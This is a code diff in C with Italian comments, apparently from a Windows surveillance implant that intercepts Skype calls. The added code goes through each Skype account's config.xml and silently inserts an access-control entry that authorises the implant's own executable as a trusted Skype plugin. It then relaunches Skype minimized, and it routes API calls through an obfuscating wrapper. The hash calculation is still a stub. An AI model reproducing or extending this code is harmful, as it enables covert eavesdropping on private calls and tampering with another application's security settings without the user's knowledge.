@@ -94,6 +94,8 @@ typedef struct _VoiceAdditionalData {
 // In questo caso i bit da 24 a 29 sono usati per identificare il tipo di 
 // programma utilizzato <voip_program>
 
+#define MAX_HASHKEY_LEN 256 // Lunghezza massima chiavi di hash per skype config
+
 #define DEFAULT_SAMPLE_SIZE (512*1024) // 512KB
 #define DEFAULT_COMPRESSION 3
 #define MAX_ID_LEN 250
@@ -1931,15 +1933,16 @@ char *GetXMLNodeA(char *data, char *node, char *buffer)
 	return ptr2;	
 }
 
-BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path)
+// Verifica se l'ACL nel file corrisponde alla nostra
+BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
 {
-	// XXX TODO
-	if (!strcmp(key1, "k1"))
+	if (!stricmp(key1, m_key1) && !stricmp(key2, m_key2) && !stricmp(key3, m_key3) && !stricmp(key4, m_key4) && !stricmp(path, m_path))
 		return TRUE;
 	return FALSE;
 }
 
-BOOL IsACLPresent(WCHAR *config_path)
+// Verifica se nel file di config c'e' la nostra ACL
+BOOL IsACLPresent(WCHAR *config_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
 {
 	HANDLE hFile;
 	HANDLE hMap;
@@ -1981,7 +1984,7 @@ BOOL IsACLPresent(WCHAR *config_path)
 			ptr = GetXMLNodeA(ptr, "Key3", key3);
 			ptr = GetXMLNodeA(ptr, "Key4", key4);
 			ptr = GetXMLNodeA(ptr, "Path", path);
-			if (CheckACL(key1, key2, key3, key4, path)) {
+			if (CheckACL(key1, key2, key3, key4, path, m_key1, m_key2, m_key3, m_key4, m_path)) {
 				acl_found = TRUE;
 				break;
 			}
@@ -1994,6 +1997,7 @@ BOOL IsACLPresent(WCHAR *config_path)
 	return acl_found;
 }
 
+// Scriva la nostra ACL nel file di config
 BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char *key4, char *path)
 {
 	HANDLE hFile;
@@ -2001,7 +2005,7 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	DWORD config_size, first_part_size;
 	char *config_map;
 	char *local_config_map, *ptr = NULL;
-	BOOL acl_missing = FALSE;
+	BOOL acl_missing = FALSE, c_missing = FALSE;
 	DWORD dummy;
 
 	// Fa una copia del file in memoria
@@ -2041,6 +2045,10 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	if (!(ptr = strstr(local_config_map, "</AccessControlList>"))) {
 		acl_missing = TRUE;
 		ptr = strstr(local_config_map, "</C>");
+		if (!ptr) {
+			c_missing = TRUE;
+			ptr = strstr(local_config_map, "</UI>");
+		}
 	}
 	if (!ptr) {
 		SAFE_FREE(local_config_map);
@@ -2053,6 +2061,8 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 
 	first_part_size = ptr - local_config_map;
 	WriteFile(hFile, local_config_map, first_part_size, &dummy, NULL);
+	if (c_missing)
+		WriteFile(hFile, "<C>\r\n", strlen("<C>\r\n"), &dummy, NULL);
 	if (acl_missing)
 		WriteFile(hFile, "<AccessControlList>\r\n", strlen("<AccessControlList>\r\n"), &dummy, NULL);
 	WriteFile(hFile, "<Client98>\r\n<Key1>", strlen("<Client98>\r\n<Key1>"), &dummy, NULL);
@@ -2072,7 +2082,14 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	WriteFile(hFile, "</Path>\r\n</Client98>\r\n", strlen("</Path>\r\n</Client98>\r\n"), &dummy, NULL);
 	if (acl_missing)
 		WriteFile(hFile, "</AccessControlList>\r\n", strlen("</AccessControlList>\r\n"), &dummy, NULL);
-	WriteFile(hFile, ptr, config_size - first_part_size, &dummy, NULL);
+	if (c_missing)
+		WriteFile(hFile, "</C>\r\n", strlen("</C>\r\n"), &dummy, NULL);
+	if (!WriteFile(hFile, ptr, config_size - first_part_size, &dummy, NULL)) {
+		SetEndOfFile(hFile);
+		SAFE_FREE(local_config_map);
+		CloseHandle(hFile);
+		return FALSE;
+	}
 
 	SetEndOfFile(hFile);
 	SAFE_FREE(local_config_map);
@@ -2080,15 +2097,74 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	return TRUE;
 }
 
+// XXX TODO
+BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
+{
+	sprintf(m_key1, "hash1");
+	sprintf(m_key2, "hash2");
+	sprintf(m_key3, "hash3");
+	sprintf(m_key4, "hash4");
+	sprintf(m_path, "path");
+	return TRUE;
+}
+
+// Cerca (e in caso fa calcolare) gli hash corretti relativi ad un particolare utente
+BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
+{
+	typedef struct {
+		WCHAR user_name[MAX_PATH];
+		char m_key1[MAX_HASHKEY_LEN];
+		char m_key2[MAX_HASHKEY_LEN];
+		char m_key3[MAX_HASHKEY_LEN];
+		char m_key4[MAX_HASHKEY_LEN];
+		char m_path[MAX_HASHKEY_LEN];
+	} user_hash_struct;
+
+	static user_hash_struct *user_hash_array = NULL;
+	static DWORD user_hash_size = 0;
+	user_hash_struct *tmp_ptr = NULL;
+	DWORD i;
+
+	for (i=0; i<user_hash_size && user_hash_array; i++) {
+		if (!wcscmp(user_hash_array[i].user_name, user_name)) {
+			memcpy(m_key1, user_hash_array[i].m_key1, MAX_HASHKEY_LEN);
+			memcpy(m_key2, user_hash_array[i].m_key2, MAX_HASHKEY_LEN);
+			memcpy(m_key3, user_hash_array[i].m_key3, MAX_HASHKEY_LEN);
+			memcpy(m_key4, user_hash_array[i].m_key4, MAX_HASHKEY_LEN);
+			memcpy(m_path, user_hash_array[i].m_path, MAX_HASHKEY_LEN);
+			return TRUE;
+		}
+	}
+
+	if (!CalculateUserHash(user_name, file_path, m_key1, m_key2, m_key3, m_key4, m_path))
+		return FALSE;
+
+	if ( !(tmp_ptr = (user_hash_struct *)realloc(user_hash_array, (user_hash_size+1)*sizeof(user_hash_struct))) )
+		return TRUE;
+	user_hash_array = tmp_ptr;
+	memcpy(user_hash_array[user_hash_size].user_name, user_name, sizeof(user_hash_array[user_hash_size].user_name));
+	memcpy(user_hash_array[user_hash_size].m_key1, m_key1, sizeof(user_hash_array[user_hash_size].m_key1));
+	memcpy(user_hash_array[user_hash_size].m_key2, m_key2, sizeof(user_hash_array[user_hash_size].m_key2));
+	memcpy(user_hash_array[user_hash_size].m_key3, m_key3, sizeof(user_hash_array[user_hash_size].m_key3));
+	memcpy(user_hash_array[user_hash_size].m_key4, m_key4, sizeof(user_hash_array[user_hash_size].m_key4));
+	memcpy(user_hash_array[user_hash_size].m_path, m_path, sizeof(user_hash_array[user_hash_size].m_path));
+	user_hash_size++;
+
+	return TRUE;
+}
+
+// Inserisce i permessi corretti per potersi attaccare a skype come plugin
 void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 {
 	WCHAR skype_data[MAX_PATH];
 	WCHAR skype_search[MAX_PATH];
 	WCHAR config_path[MAX_PATH];
+	WCHAR core_path[MAX_PATH];
 	char skype_exe_path[MAX_PATH];
 	WIN32_FIND_DATAW find_data;
-	HANDLE hFind, hSkype;
+	HANDLE hFind, hSkype, hFile;
 	BOOL is_to_respawn = FALSE;
+	char m_key1[MAX_HASHKEY_LEN], m_key2[MAX_HASHKEY_LEN], m_key3[MAX_HASHKEY_LEN], m_key4[MAX_HASHKEY_LEN], m_path[MAX_HASHKEY_LEN];
 
 	// Trova il path di %appdata%\Skype
 	if(!FNC(GetEnvironmentVariableW)(L"appdata", skype_data, MAX_PATH)) 
@@ -2096,6 +2172,8 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 	wcscat_s(skype_data, MAX_PATH, L"\\Skype\\");
 	_snwprintf_s(skype_search, sizeof(skype_search)/sizeof(WCHAR), _TRUNCATE, L"%s\\*", skype_data); 
 	_snprintf_s(skype_exe_path, sizeof(skype_exe_path), _TRUNCATE, "%S\\Phone\\Skype.exe /nosplash /minimized", skype_path); 
+	if (GetModuleFileNameW(NULL, core_path, MAX_PATH) == 0)
+		return;
 
 	// Cicla tutte le directory degli account
 	hFind = FNC(FindFirstFileW)(skype_search, &find_data);
@@ -2105,12 +2183,16 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 		if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
 			if (find_data.cFileName[0] == L'.')
 				continue;
+			// Verifica che sia realmente un utente
 			_snwprintf_s(config_path, sizeof(config_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\%s\\config.xml", skype_data, find_data.cFileName); 
+			if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+				continue;
+			CloseHandle(hFile);
 			// Verifica se contiene gia' la permission altrimenti la scrive
-			if (!IsACLPresent(config_path))
-				// XXX TODO 
-				if (WriteSkypeACL(config_path, "k1", "k2", "k3", "k4", "path"))
-					is_to_respawn = TRUE;
+			if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path))
+				if (!IsACLPresent(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
+					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
+						is_to_respawn = TRUE;
 		}
 	} while (FNC(FindNextFileW)(hFind, &find_data));
 	FNC(FindClose)(hFind);
